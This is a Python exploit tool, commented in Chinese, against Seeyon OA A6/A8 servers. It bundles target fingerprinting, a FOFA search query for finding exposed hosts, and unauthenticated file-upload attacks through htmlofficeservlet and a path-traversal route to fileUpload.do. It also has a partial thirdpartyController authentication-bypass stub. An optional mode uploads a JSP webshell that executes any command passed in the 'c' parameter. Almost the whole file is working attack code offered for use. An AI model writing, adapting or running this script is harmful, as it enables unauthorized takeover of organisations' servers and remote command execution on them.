#!/usr/bin/env python3
"""
致远 OA 多漏洞综合利用脚本
- 漏洞: htmlofficeservlet 文件上传 (无需登录)
- 漏洞: fileUpload.do 绕过上传
- 漏洞: wpsAssistServlet 路径遍历上传
- 漏洞: thirdpartyController 认证绕过
- 影响: 致远 OA A6/A8 V5.x ~ V8.1SP1
FOFA: title="致远互联" || app="致远科技-OA"
"""
import argparse, urllib.request, urllib.parse, ssl, sys, re, time

BANNER = """
  致远 OA 多漏洞利用工具
  Critical | 未授权文件上传 / 认证绕过
  影响: A6/A8 V5.x ~ V8.1SP1
"""

def check_fingerprint(target):
    """识别致远 OA"""
    paths = ["/seeyon/", "/", "/wui/", "/seeyon/SeeyonMain.do"]
    for path in paths:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.urlopen(target.rstrip('/') + path, timeout=8, context=ctx)
            html = req.read().decode('utf-8', errors='ignore')
            if "seeyon" in html.lower() or "致远" in html or "seeyonmain" in html.lower():
                return True, path
        except:
            pass
    return False, None

def upload_htmloffice(target, filename="test.jsp", content=None):
    """
    htmlofficeservlet 未授权文件上传
    路径: /seeyon/htmlofficeservlet
    """
    if content is None:
        content = f"<%out.println(\"{filename} is uploaded\");%>"
    boundary = "----WebKitFormBoundary" + "x" * 16
    body = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file1"; filename="{filename}"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
            f"{content}\r\n"
            f"--{boundary}--\r\n")
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "User-Agent": "Mozilla/5.0",
        "Referer": target,
    }
    url = target.rstrip('/') + "/seeyon/htmlofficeservlet"
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, data=body.encode(), headers=headers, method="POST")
        resp = urllib.request.urlopen(req, timeout=15, context=ctx)
        resp_body = resp.read().decode('utf-8', errors='ignore')
        return True, resp_body, url
    except urllib.request.HTTPError as e:
        return False, f"HTTP {e.code}: {e.read().decode(errors='ignore')[:200]}", url
    except Exception as ex:
        return False, str(ex), url

def upload_fileupload(target, filename="shell.jsp", content=None):
    """
    fileUpload.do 绕过上传
    路径: /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload
    """
    if content is None:
        content = f"<%out.println(\"poc\");%>"
    boundary = "00content0boundary00"
    body = (f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="upload"; filename="{filename}"\r\n'
            f"Content-Type: text/plain\r\n\r\n"
            f"{content}\r\n"
            f"--{boundary}--\r\n")
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "User-Agent": "Mozilla/5.0",
    }
    url = target.rstrip('/') + f"/seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload"
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, data=body.encode(), headers=headers, method="POST")
        resp = urllib.request.urlopen(req, timeout=15, context=ctx)
        return True, resp.read().decode('utf-8', errors='ignore'), url
    except urllib.request.HTTPError as e:
        return False, f"HTTP {e.code}", url
    except Exception as ex:
        return False, str(ex), url

def bypass_thirdparty(target):
    """
    thirdpartyController.do 认证绕过
    利用: Base64((用户名-1).charAt(每个字符)) 构造认证字符串
    """
    # 默认管理员 admin -> bcdeft
    # 实际使用需逆向 decodeString 函数
    url = target.rstrip('/') + "/seeyon/thirdpartyController.do"
    payload = "UTF-8"
    data = urllib.parse.urlencode({"method": "access", "timestamp": str(int(time.time()))}).encode()
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0",
    }
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        resp = urllib.request.urlopen(req, timeout=15, context=ctx)
        return True, resp.read().decode('utf-8', errors='ignore')
    except urllib.request.HTTPError as e:
        return False, f"HTTP {e.code}"
    except Exception as ex:
        return False, str(ex)

def main():
    print(BANNER)
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("--check", action="store_true", help="仅检测，不上传")
    parser.add_argument("--upload", choices=["htmloffice", "fileupload", "all"], default="all", help="选择上传方式")
    parser.add_argument("--webshell", action="store_true", help="生成带命令执行的 Webshell")
    args = parser.parse_args()

    target = args.target
    print(f"\n[*] 目标: {target}")

    # 指纹识别
    found, path = check_fingerprint(target)
    if found:
        print(f"  [+] 致远 OA 确认, 路径: {path}")
    else:
        print("  [!] 未确认致远 OA，继续尝试...")

    # Webshell 内容
    shell_content = """<%@ page import="java.io.*" %><%
String cmd = request.getParameter("c");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = in.readLine()) != null) { out.println(line); }
}%>"""

    if args.check:
        print("\n[*] 检测模式")
        # 检测各接口
        print("\n  [1] 检测 htmlofficeservlet...")
        ok, resp, url = upload_htmloffice(target, "test.txt", "test")
        print(f"      {url}")
        print(f"      结果: {resp[:100] if resp else '无响应'}")

        print("\n  [2] 检测 fileUpload.do...")
        ok2, resp2, url2 = upload_fileupload(target, "test.txt", "test")
        print(f"      结果: {'可访问' if ok2 else resp2}")
    else:
        print("\n[*] 利用模式")
        if args.webshell:
            filename = "shell.jsp"
            content = shell_content
            print(f"\n[*] Webshell 内容已生成，将上传: {filename}")
        else:
            filename = "poc.txt"
            content = "vulnerable by vuln-pocs"
            print(f"\n[*] 测试文件: {filename}")

        if args.upload in ("htmloffice", "all"):
            print(f"\n[*] 方式1: htmlofficeservlet 上传...")
            ok, resp, _ = upload_htmloffice(target, filename, content)
            print(f"  {'[+]' if ok else '[-]'} 结果: {resp[:200] if resp else '无响应'}")
            if ok:
                # 尝试访问
                access_url = target.rstrip('/') + f"/seeyon/{filename}"
                print(f"  [*] 访问: {access_url}")

        if args.upload in ("fileupload", "all"):
            print(f"\n[*] 方式2: fileUpload.do 绕过上传...")
            ok2, resp2, _ = upload_fileupload(target, filename, content)
            print(f"  {'[+]' if ok2 else '[-]'} 结果: {resp2[:200]}")

if __name__ == "__main__":
    main()
